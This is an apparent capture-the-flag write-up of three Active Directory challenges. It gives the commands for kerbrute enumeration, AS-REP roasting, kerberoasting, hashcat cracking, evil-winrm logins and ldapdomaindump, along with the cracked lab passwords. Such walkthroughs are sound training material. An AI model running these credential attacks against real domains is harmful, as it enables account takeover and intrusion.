# Blemflarck

This challenge is related to Active Directory in which we are given these files, `admins.txt` , `hosts` and `nmap.txt`

<img src="https://i.imgur.com/blefZnn.png"/>

admins.txt contains a list of usernames

<img src="https://i.imgur.com/17hPdnK.png"/>

nmap.txt contains result of nmap of the domain controller

<img src="https://i.imgur.com/qZymuxN.png"/>

and `hosts` contains the IP and domain name of the target

<img src="https://i.imgur.com/v5QlqoD.png"/>

Now to start solving this, we have a list of usernames of the domain, need to verfiy which users are valid on the domain for that we can use `kerbrute`

<img src="https://i.imgur.com/hSxMEcf.png"/>
We can try performing AS-REP roasting using `GetNPUsers` from `impacket` in which the user `shreya` doesn't have pre-authentication set so without providing a valid password for the user we can request for his TGT

```bash
GetNPUsers.py vindicators.space/ -usersfile ./admins.txt -request
```

<img src="https://i.imgur.com/HAZ2yXJ.png"/>

To crack this we can use `hashcat` with mode `18200

```bash
hashcat -a 0 -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt --force 
```

<img src="https://i.imgur.com/Q1YpH6e.png"/>

This will crack the hash with password `$anturce77RioGr@ndePR`

<img src="https://i.imgur.com/oeWS1ys.png"/>
Now having the credentials we can login through WinRM  which is running on port 5985 using `evil-winrm`

```bash
evil-winrm -i 34.218.188.252 -u 'shreya' -p ''
```
After logging in we can get the flag for this challenge

<img src="https://i.imgur.com/3vJfhCJ.png"/>

## PhoenixPerson 

<img src="https://i.imgur.com/ElPQQ9s.png"/>

This challenge is continuation from the first one, we have a valid set of credential, we can try using kerberoasting, if there's a SPN tied to an account we can request for TGS and later crack it 

```bash
GetUserSPNs.py vindicators.space/shreya -request
```
<img src="https://i.imgur.com/jTxv1iK.png"/>

Runing hashcat to crack this hash

<img src="https://i.imgur.com/mrkWL6I.png"/>

<img src="https://i.imgur.com/4Ju33Rh.png"/>

Now logging with mirage user

```bash
evil-winrm -i 34.218.188.252 -u 'mirage' -p '!@#New_Life87!@#'
```

<img src="https://i.imgur.com/AYNENVw.png"/>

## DAB-389 b

<img src="https://i.imgur.com/EDJ4n2x.png"/>

This challenge is the last part of AD category where we need to find the third flag through the user `mirage`

From the description the number 389 is referrenced as LDAP which is the port number for that service, we need to enumerate LDAP, there's a tool called `ldapdomaindump`

```bash
ldapdomaindump -u 'mirage' -p '!@#New_Life87!@#' ldap://34.218.188.252
```

<img src="https://i.imgur.com/Z5r7m9p.png"/>
This will generate some html files for users, groups and computers in the domain, going through the `domain_users.html` file we'll get the first part of the flag

<img src="https://i.imgur.com/npDFACX.png"/>

<img src="https://i.imgur.com/icvuQ4s.png"/>

The second part will be found from `domain_computers.html`

<img src="https://i.imgur.com/szr19bM.png"/>

And the third one from `domain_groups.html`

<img src="https://i.imgur.com/kpF554N.png"/>

We can get the flag through `grep` as well by using regular expression

<img src="https://i.imgur.com/w1hyD7J.png"/>

Which makes the final flag

```
flag{3fe05494a09ac38bb5199698b475c48c_LD4P_3num3r4t10n_FTW_:)}

```
There were good challenges and a lot of categories including web3, cloud and source code review which I haven't done before, due to me doing "real world assesments" I wasn't able to touch the rest of the challenges 

<img src="https://i.imgur.com/PTZoCop.png"/>

## References
 - https://hashcat.net/wiki/doku.php?id=example_hashes
 - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 - https://www.cyberciti.biz/faq/grep-regular-expressions/
